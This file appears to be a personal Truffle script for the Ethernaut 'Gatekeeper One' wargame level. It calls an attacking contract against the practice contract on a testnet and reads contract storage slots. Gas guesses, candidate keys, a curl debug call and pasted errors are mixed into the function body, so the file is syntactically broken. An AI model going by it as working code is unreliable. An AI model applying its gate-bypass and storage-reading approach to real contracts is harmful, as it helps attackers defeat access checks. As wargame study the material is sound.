module.exports = function (callback) {
    const GateCracker = artifacts.require("GateCracker");
    const VulnContractType = artifacts.require("GatekeeperOne");

    //ropsten
    let attacker_address = "0x30c947301d4344091fac586c5dd1dba97385f5bb"
    //ganache
    //let attacker_address = "0xd014958E18CE9f4Ae8d2eFfD131d692223360281"

    function transact(contractFunction, params) {
        GateCracker.deployed().then(function (instance) {
            return instance[contractFunction](...params);
        }).then(function (result) {
            console.log(result);
        }).catch(function (e) {
            console.log("error: " + e);
            //error
        })
    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms)
        })
    }
    async function guess() {
        //ganache
        let cracker = await GateCracker.deployed();
        //let vuln = await VulnContractType.deployed();

        //ropsten ethernaut
        let vuln = await VulnContractType.at("0x834b8ab125b33c4bf7acaeb536700d13aa53e64a");

        /* let wins = await cracker["crack"](vuln.address, 300000, 0x0102030405060708, {
            from: attacker_address
        }); */
//0x0102030405060708


818906
798893
//The amount it should be without vars 819294
839307 // The amount plus what it takes to create a variable
839301 //gas left on compare
242 // difference between current gas sent and amount left
//d014958e18ce9f4ae8d2effd131d692223360281
0xd014000000000018 //what worked on the first two
0xd01400000000281
  //d014000000000014
0xd0140000000002837e
  //d014000000000014

  //Working on testnet on GatekeeperOneEdit
  //"0xd014000000000281"

  //working on Remix VM
  //0xbbf289d846208c16edc8474705c748aff07732db, 82152, 0x000000010000733c
  //Let's try metamask
  //0x73de1b25ded053e668b52a3818c1e4e13d86df8e, 82152, 0x000000010000f5bb
  //You must change the last two bytes of the key and the source address, maybe the gas too.
  //0x9dd1e8169e76a9226b07ab9f85cc20a5e1ed44dd, 819281,  "0xd01400000000733c"
   //0x834b8ab125b33c4bf7acaeb536700d13aa53e64a, 819281,  "0xd01400000000f5bb"
  //debug.traceTransaction("0x49cc418a13ec96afeb9bac3e00b70d47c64ebb134f8973eb39dbcdef1bac4da2")
  // debug.traceTransaction("0xd602527e2292923a40092263fa22a055aa16e1d8763c65f0a83a424b435d63c4")
  curl localhost:8545 -X POST --header 'Content-type: application/json' --data '{"jsonrpc":"2.0", "method":"debug_traceTransaction", "params":["0x3684f071b34da1116282ee88a106a8f2a266d273ef7d8964957f65128fb58d77", {}], "id":1}'

  //This is where we get our response
  //if (request.readyState === 4 && request.timeout !== 1) {

  //This is where we send the request, we can change the params here to fix it.
  //request.send(JSON.stringify(payload));

  //These are the options for remix vm
 /*  options:
disableMemory: false
disableStack: false
disableStorage: true
fullStorage: false */

  //The following are available to debug on ropsten
  //Keeper
  0xb0c43de665e80e290a44e77f4e0077dae5300d62

  //Cracker
  0xc3582218d09debf7546765cae4fbcce12621b102

  "Error: Invalid JSON RPC response: ""
    at Object.InvalidResponse (https://remix.ethereum.org/build/app.js:175245:16)
    at XMLHttpRequest.request.onreadystatechange (https://remix.ethereum.org/build/app.js:176482:24)"

  //If the VM fails on the first test
  1947  // cost of computation
  25331 //tx cost
  //If ropsten fails on the first test
  25371
        let wins = await transact("crack",([vuln.address, 819342, "0xd01400000000f5bb" ,{
            from: attacker_address
        }]));

        console.log(wins);
        
    }

    async function getStore(index, address) {
        if (address == undefined){
            let instance = await VulnContractType.deployed();
            address = instance.address;
        }
        web3.eth.getStorageAt(address, index,
            function (err, count) {
                if (count != "0x0000000000000000000000000000000000000000000000000000000000000000" && count != "0x00"){
                    console.log("At index " + index + ": " + parseInt(count,16));
                }
            });
    }

    //A ropsten Privacy contract by remix
    //let remix = "0x9a106d4a612645b710d7032d7db50a5fa782d353";
    //["0x3984723947","0x239479283498","0x34823428"]
    //["0x616263646566676869","0x616263646566676869","0x616263646566676869"]
    //["0x616263646566676869","0x616263646566676869","0x63"]
    //0xdd75274895fdf54f6d49db8050428b7875928bd2, 79256, 0x6162000000000000
    // 0x138c9dff6d278695d4c766c70955c0d5f94111f7, 163841, 0x6162000000000000
    
    
    //ethernaut contract
    //let ethernaut = "0xf9c9174daab0a96f594f3c798ac301fc57844a6b";
    guess();
    for (i = 0; i < 200; i++) {
        getStore(i);
    }
}

//first time ganache
/* Current count: 0x0fc38589085b52fa5b31e601b32450043ddfac13
Current count: 0x02
Current count: 0x00
Current count: 0x00
Current count: 0x00
Current count: 0x00
Current count: 0x00
Current count: 0x00 */


//first time, ropstein network ethernaut
/* Current count: 0xe68de411936911bfabfb3398fb04500838883ac7db5783fa5f95d25a6a617c85
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x00000000000000000000000000000000000000000000000000000057ddff0a01
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x127c3dbb843c9101b4ba1cc1f16d22d3479a0d24693ca42bb07349f03b25d245
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0xef1e4962e514c5e9f35d91932d31d3a501934fe1e7ec99ebcacdf32f5b27ad2a
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000 */


//second time ropstein network ethernaut
/* Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x127c3dbb843c9101b4ba1cc1f16d22d3479a0d24693ca42bb07349f03b25d245
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0xef1e4962e514c5e9f35d91932d31d3a501934fe1e7ec99ebcacdf32f5b27ad2a
Current count: 0x0000000000000000000000000000000000000000000000000000006780ff0a01
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0xe68de411936911bfabfb3398fb04500838883ac7db5783fa5f95d25a6a617c85
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000 */

